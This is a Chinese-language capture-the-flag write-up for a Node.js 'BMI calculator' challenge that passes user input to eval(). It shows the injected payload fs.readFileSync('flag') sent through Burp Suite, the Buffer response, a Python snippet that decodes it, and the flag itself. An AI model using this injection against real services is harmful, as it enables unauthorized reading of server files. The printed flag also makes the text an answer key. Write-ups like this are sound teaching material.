# BMI 計算機

Author: 孫逸平

Date: 2024-06-06

Link: https://ctfd.fhh4ck3rs.taipei/challenges#BMI%20%E8%A8%88%E7%AE%97%E6%A9%9F-5

## 題目說明

體重的控制是重要的
> Author: xiunG

......但是說真的，減肥真的好難ＱＷＱ

所以...別講這種傷感情的事情了好嗎！

[BMI-Calculator.zip](./src/BMI-Calculator.zip)

## Write-up

1. 觀察題目給的 `app.js` 檔，發現使用 `eval()` 進行 BMI 的運算，且前端會先拼接好算式再丟到後端。
2. 故使用 Burp Suite 攔截並修改封包中的 `string` 值為：`fs.readFileSync('flag')`。
3. 傳送封包後得到以下訊息：
   ```JSON
   {"result":{"type":"Buffer","data":[70,104,67,84,70,123,98,82,101,65,107,95,98,77,49,95,99,65,99,117,49,97,84,48,114,125]}}
   ```
4. 將 data 中的數值，利用 ASCII 轉換成文字後（可使用下方 Python 程式），就得到 flag 了：`FhCTF{bReAk_bM1_cAcu1aT0r}`
   ```Python
   a = [70,104,67,84,70,123,98,82,101,65,107,95,98,77,49,95,99,65,99,117,49,97,84,48,114,125]

   for i in a:
     print(chr(i), end = "")
   ```
